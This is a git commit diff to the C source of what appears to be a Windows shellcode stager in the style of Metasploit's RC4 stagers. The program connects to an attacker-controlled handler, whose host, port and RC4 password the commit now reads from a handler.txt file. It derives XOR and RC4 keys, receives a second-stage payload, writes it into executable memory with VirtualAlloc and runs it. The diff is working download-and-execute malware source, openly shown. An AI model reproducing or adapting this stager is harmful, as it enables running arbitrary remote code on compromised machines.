9d31f6a6bcf21a7121ff471927d0acbd78c33299
XhstormR <10527522+XhstormR@users.noreply.github.com>
2019-12-28 00:32:51 +0800

    Signed-off-by: XhstormR <10527522+XhstormR@users.noreply.github.com>

--- src/main.c
+++ src/main.c
@@ -1,9 +1,12 @@
+#include <io.h>
+#include <stdio.h>
 #include <winsock2.h>
 #include <windows.h>
 
 #include "rc4.h"
 #include "sha1.h"
 
+#define TOKEN ":"
 #define HOST "0.0.0.0"
 #define PORT "443"
 #define RC4PASS "pass"
@@ -28,33 +31,77 @@ static SOCKET ws_connect(char *ip, char *port) {
   return s;
 }
 
-static long recv_all(SOCKET s, char *buf, long len) {
-  long ret = 0;
+static int recv_all(SOCKET s, char *buf, int len) {
+  int ret = 0;
   while (ret < len) {
     ret += recv(s, buf + ret, len - ret, 0);
   }
   return ret;
 }
 
-static char *download(long *rawSize) {
+static char *trim(char *str) {
+  char *ptr = str;
+  int len = strlen(ptr);
+
+  while (isspace(ptr[len - 1])) {
+    ptr[--len] = 0;
+  }
+  while (*ptr && isspace(*ptr)) {
+    ++ptr, --len;
+  }
+
+  memmove(str, ptr, len + 1);
+  return str;
+}
+
+static char *readFile() {
+  FILE *file = fopen("handler.txt", "rb");
+
+  fseek(file, 0, SEEK_END);
+  int len = ftell(file);
+  rewind(file);
+
+  char *text = malloc(len + 1);
+  fread(text, sizeof(char), len, file);
+  text[len] = 0;
+  fclose(file);
+
+  return text;
+}
+
+static char *getHandler(int *rawSize) {
+  char *host;
+  char *port;
+  char *rc4pass;
+  if (access("handler.txt", F_OK) == 0) {
+    char *text = trim(readFile());
+    host = strtok(text, TOKEN);
+    port = strtok(0, TOKEN);
+    rc4pass = strtok(0, TOKEN);
+  } else {
+    host = HOST;
+    port = PORT;
+    rc4pass = RC4PASS;
+  }
+
   ws_init();
-  WSOCKET = ws_connect(HOST, PORT);
+  WSOCKET = ws_connect(host, port);
 
   char key[SHA1_DIGEST_SIZE + 1];
   key[SHA1_DIGEST_SIZE] = 0;
-  sha1_buffer(RC4PASS, strlen(RC4PASS), key);
+  sha1_buffer(rc4pass, strlen(rc4pass), key);
   char *rc4key = key + 4;
   int xorkey = 0;
   for (int i = 0; i < 4; i++) {
     xorkey ^= key[i] << i * 8;
   }
 
-  long size;
+  int size;
   recv(WSOCKET, (char *)&size, 4, 0);
   size ^= xorkey;
 
   *rawSize = size + 5;
-  char *buf = (char *)malloc(*rawSize);
+  char *buf = malloc(*rawSize);
 
   // BF 78 56 34 12 => mov edi, 0x12345678
   buf[0] = 0xBF;
@@ -68,8 +115,8 @@ static char *download(long *rawSize) {
 }
 
 int main() {
-  long rawSize;
-  char *raw = download(&rawSize);
+  int rawSize;
+  char *raw = getHandler(&rawSize);
 
   void *ptr = VirtualAlloc(0, rawSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
   memcpy(ptr, raw, rawSize);
